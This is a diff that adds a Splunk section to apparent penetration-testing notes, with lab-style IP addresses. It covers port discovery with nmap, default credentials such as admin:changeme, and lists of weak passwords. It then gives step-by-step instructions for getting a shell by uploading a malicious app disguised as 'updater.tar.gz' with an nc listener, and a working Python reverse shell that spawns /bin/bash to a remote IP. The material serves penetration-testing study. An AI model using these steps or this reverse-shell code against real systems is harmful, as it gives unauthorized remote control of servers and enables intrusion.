@@ -565,4 +565,52 @@ nc -lvnp 8443
 
 ## Splunk
 
-### Discovery & Enumeration
+### Discovery
+
+- Runs on port 8000 by default, port 8089 is the Splunk management port for communication with the Splunk REST API
+- Detect with nmap service scan:
+```bash
+sudo nmap -sV 10.129.201.50
+```
+
+### Enumeration
+
+- Check for a forgotton about trial version (converts to free version with no authentication after 60 days)
+- Older versions have default creds admin:changeme
+- Later versions set creds during install, check for common weak passwords (admin, Welcome, Welcome1, Password123, etc)
+
+### Attacking Splunk
+
+#### Abusing Built-In Functionality
+
+**Windows Hosts**
+- Clone reverse shell from GitHub
+```bash
+git clone https://github.com/0xjpuff/reverse_shell_splunk.git
+```
+- Edit attacker_ip_here and attacker_port_here in ```reverse_shell_splunk/reverse_shell_splunk/bin/run.ps1```
+- Create tar ball of the directory
+```bash
+cd reverse_shell_splunk
+tar -cvzf updater.tar.gz reverse_shell_splunk/
+```
+- Start a listener
+```bash
+nc -nvlp 9001
+```
+- In browser click ```Apps > Manage Apps(cog symbol) > Install app from file```
+- ```Browse``` to select tar ball then click ```Upload``` this will trigger the reverse shell
+
+**Linux Hosts**
+- Edit ```rev.py``` to:
+```python
+import sys,socket,os,pty
+
+ip="10.10.14.15"
+port="443"
+s=socket.socket()
+s.connect((ip,int(port)))
+[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
+pty.spawn('/bin/bash')
+```
+
